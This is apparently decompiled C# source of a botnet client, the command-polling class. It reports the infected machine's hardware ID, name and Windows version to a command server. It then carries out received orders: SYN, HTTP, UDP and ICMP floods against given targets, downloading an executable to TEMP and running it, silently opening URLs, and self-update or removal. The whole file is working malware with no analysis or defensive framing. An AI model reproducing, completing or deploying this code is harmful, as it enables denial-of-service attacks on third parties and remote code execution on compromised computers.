using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Text;
using System.Threading;

namespace ns0;

internal class Class15
{
	private string string_0 = string.Empty;

	public void method_0()
	{
		method_1();
		Thread thread = new Thread(method_2);
		thread.Start();
	}

	private void method_1()
	{
		string string_ = "mode=0&hwid=" + Class4.class11_0.string_6 + "&botver=" + Class4.class11_0.string_3 + "&pcname=" + Class4.class11_0.string_7 + "&winver=" + Class4.class11_0.string_8;
		while (true)
		{
			try
			{
				string text = method_3(Class4.class11_0.string_2, string_);
				if (text.Length > 0)
				{
					if (text == Class4.class11_0.string_5)
					{
						break;
					}
					Environment.Exit(-1);
				}
			}
			catch
			{
			}
			Thread.Sleep(Class4.class11_0.int_0 * 60 * 1000);
		}
	}

	private void method_2()
	{
		string string_ = "mode=1&hwid=" + Class4.class11_0.string_6;
		while (true)
		{
			try
			{
				string text = method_3(Class4.class11_0.string_2, string_);
				if (text.Length > 0)
				{
					if (text != string_0)
					{
						method_4(text);
						string_0 = text;
					}
				}
				else
				{
					try
					{
						Class9.smethod_1();
					}
					catch
					{
					}
					try
					{
						Class0.smethod_1();
					}
					catch
					{
					}
					try
					{
						Class5.smethod_1();
					}
					catch
					{
					}
					try
					{
						Class13.smethod_1();
					}
					catch
					{
					}
					string_0 = string.Empty;
				}
			}
			catch
			{
			}
			Thread.Sleep(Class4.class11_0.int_0 * 60 * 1000);
		}
	}

	private string method_3(string string_1, string string_2)
	{
		ServicePointManager.Expect100Continue = false;
		HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(string_1);
		httpWebRequest.ContentType = "application/x-www-form-urlencoded";
		httpWebRequest.Method = "POST";
		httpWebRequest.UserAgent = Class4.class11_0.string_5;
		byte[] bytes = Encoding.ASCII.GetBytes(string_2);
		httpWebRequest.ContentLength = bytes.Length;
		Stream requestStream = httpWebRequest.GetRequestStream();
		requestStream.Write(bytes, 0, bytes.Length);
		requestStream.Close();
		WebResponse response = httpWebRequest.GetResponse();
		if (response == null)
		{
			return string.Empty;
		}
		StreamReader streamReader = new StreamReader(response.GetResponseStream());
		return streamReader.ReadToEnd().Trim();
	}

	private void method_4(string string_1)
	{
		string[] array = new string[0];
		try
		{
			array = string_1.Split(new char[1] { '*' });
		}
		catch
		{
		}
		switch (array[0])
		{
		case "synflood":
			try
			{
				Class9.string_0 = Convert.ToString(array[1]);
				Class9.ushort_0 = ushort.Parse(array[2]);
				Class9.int_1 = Convert.ToInt32(array[3]);
				Class9.int_0 = Convert.ToInt32(array[4]);
				Class9.smethod_0();
				break;
			}
			catch
			{
				break;
			}
		case "httpflood":
			try
			{
				Class0.string_0 = Convert.ToString(array[1]);
				Class0.int_0 = Convert.ToInt32(array[2]);
				Class0.smethod_0();
				break;
			}
			catch
			{
				break;
			}
		case "udpflood":
			try
			{
				Class5.string_0 = Convert.ToString(array[1]);
				Class5.ushort_0 = ushort.Parse(array[2]);
				Class5.int_1 = Convert.ToInt32(array[3]);
				Class5.int_2 = Convert.ToInt32(array[4]);
				Class5.int_0 = Convert.ToInt32(array[5]);
				Class5.smethod_0();
				break;
			}
			catch
			{
				break;
			}
		case "icmpflood":
			try
			{
				Class13.string_0 = Convert.ToString(array[1]);
				Class13.ushort_0 = ushort.Parse(array[2]);
				Class13.int_2 = Convert.ToInt32(array[3]);
				Class13.int_0 = Convert.ToInt32(array[4]);
				Class13.int_1 = Convert.ToInt32(array[5]);
				Class13.smethod_0();
				break;
			}
			catch
			{
				break;
			}
		case "download":
			try
			{
				string text = Class4.class8_0.method_3(new Random().Next(5, 12)) + ".exe";
				new WebClient().DownloadFile(Convert.ToString(array[1]), Environment.GetEnvironmentVariable("TEMP") + "\\" + text);
				Process process = new Process();
				process.StartInfo.FileName = Environment.GetEnvironmentVariable("TEMP") + "\\" + text;
				process.Start();
				break;
			}
			catch
			{
				break;
			}
		case "visit":
			try
			{
				Process process = new Process();
				process.StartInfo = new ProcessStartInfo(Convert.ToString(array[1]));
				process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process.Start();
				break;
			}
			catch
			{
				break;
			}
		case "update":
			Class4.class16_0.method_3(Convert.ToString(array[1]));
			break;
		case "remove":
			if (array[1] == Environment.MachineName || array[1].ToUpper() == "ALL")
			{
				Class4.class16_0.method_4();
			}
			break;
		}
	}
}
